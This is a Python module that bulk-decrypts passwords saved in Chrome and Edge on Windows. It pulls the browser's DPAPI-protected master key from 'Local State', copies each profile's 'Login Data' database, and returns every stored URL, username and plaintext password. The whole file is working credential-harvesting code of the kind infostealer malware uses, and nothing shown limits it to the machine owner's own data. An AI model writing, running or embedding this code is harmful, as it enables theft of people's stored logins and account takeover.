"""
Decrypt saved passwords from Chrome and Edge (Chromium-based browsers).
Requires pywin32 and pycryptodome — both already in requirements.txt.
"""
import base64
import json
import os
import shutil
import sqlite3
import tempfile


def _get_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        data = json.load(f)
    key_b64 = data["os_crypt"]["encrypted_key"]
    key_enc = base64.b64decode(key_b64)[5:]  # strip "DPAPI" prefix
    import win32crypt
    return win32crypt.CryptUnprotectData(key_enc, None, None, None, 0)[1]


def _decrypt(blob, key):
    try:
        if blob[:3] in (b"v10", b"v11"):
            from Crypto.Cipher import AES
            iv, enc, tag = blob[3:15], blob[15:-16], blob[-16:]
            return AES.new(key, AES.MODE_GCM, iv).decrypt_and_verify(enc, tag).decode("utf-8", errors="replace")
        import win32crypt
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8", errors="replace")
    except Exception as e:
        return f"[decrypt failed: {e}]"


def _read_logins(login_data_path, key, browser, profile_name):
    tmp = tempfile.mktemp(suffix=".db")
    try:
        shutil.copy2(login_data_path, tmp)
        con = sqlite3.connect(tmp)
        rows = con.execute(
            "SELECT origin_url, username_value, password_value FROM logins"
        ).fetchall()
        con.close()
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass

    out = []
    for url, username, pw_blob in rows:
        out.append({
            "browser":  browser,
            "profile":  profile_name,
            "url":      url,
            "username": username,
            "password": _decrypt(pw_blob, key) if pw_blob else "",
        })
    return out


_BROWSERS = {
    "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), r"Google\Chrome\User Data"),
    "Edge":   os.path.join(os.environ.get("LOCALAPPDATA", ""), r"Microsoft\Edge\User Data"),
}


def get_browser_passwords():
    """Return list of {browser, profile, url, username, password} dicts."""
    results = []
    for browser, user_data in _BROWSERS.items():
        if not os.path.isdir(user_data):
            continue
        local_state = os.path.join(user_data, "Local State")
        if not os.path.isfile(local_state):
            continue
        try:
            key = _get_key(local_state)
        except Exception:
            continue

        # Scan Default + numbered profiles
        for entry in ["Default"] + [f"Profile {i}" for i in range(1, 30)]:
            db = os.path.join(user_data, entry, "Login Data")
            if not os.path.isfile(db):
                continue
            try:
                results.extend(_read_logins(db, key, browser, entry))
            except Exception:
                continue

    return results
